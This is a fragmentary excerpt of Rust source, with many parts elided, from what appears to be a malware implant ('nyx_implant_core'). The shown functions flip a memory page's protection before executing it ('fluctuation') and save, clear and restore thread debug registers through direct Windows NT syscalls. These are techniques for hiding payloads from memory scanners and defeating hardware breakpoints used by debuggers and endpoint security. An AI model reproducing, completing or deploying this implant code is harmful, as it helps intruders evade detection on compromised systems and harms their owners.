...
struct DrGuard<'a> {
    saved: DrState,
    rt: &'a nyx_implant_core::syscalls::Runtime,
}
...
unsafe fn do_fluctuate_resolve() -> Option<(
    &'static nyx_implant_core::syscalls::Runtime,
...
unsafe fn do_fluctuate_flip(
    ...
    let flip_ok = nyx_implant_core::syscalls::nt_protect_virtual_memory(
        rt,
        &mut prot_base,
        &mut prot_sz,
...
unsafe fn do_fluctuate_execute(
    rt: &nyx_implant_core::syscalls::Runtime,
    mut page: *mut c_void,
) -> bool {
...
unsafe fn save_dr_state(rt: &nyx_implant_core::syscalls::Runtime) -> DrState {
    ...
    let st = nyx_implant_core::syscalls::nt_get_context_thread(
        rt,
...
unsafe fn clear_dr_state(rt: &nyx_implant_core::syscalls::Runtime) {
    let mut buf = [0u8; 1232];
    ...
    let _ = nyx_implant_core::syscalls::nt_set_context_thread(
        rt,
        (-1isize) as usize,
        buf.as_mut_ptr() as usize,
    );
...
unsafe fn restore_dr_state(rt: &nyx_implant_core::syscalls::Runtime, saved: &DrState) {
    ...
    let _ = nyx_implant_core::syscalls::nt_continue(
        rt,
        buf.as_mut_ptr() as usize,
        0, // RaiseAlert = FALSE
    );
